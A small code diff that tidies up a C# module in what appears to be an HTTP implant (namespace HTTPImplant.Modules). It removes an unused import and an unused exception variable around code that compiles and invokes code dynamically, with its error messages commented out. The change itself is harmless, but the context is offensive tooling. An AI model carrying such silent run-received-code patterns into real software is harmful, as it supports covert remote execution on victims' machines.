@@ -2,7 +2,6 @@
 using System.CodeDom.Compiler;
 using System.Reflection;
 using System.Text;
-using System.Threading;
 using Microsoft.CSharp;
 
 namespace HTTPImplant.Modules
@@ -42,7 +41,7 @@ namespace HTTPImplant.Modules
                 {
                     entryPoint.Invoke(null, null); // No parameters needed for your Main method
                 }
-                catch (Exception ex)
+                catch (Exception)
                 {
                     /*Console.WriteLine($"Error during execution: {ex.Message}");*/
                 }
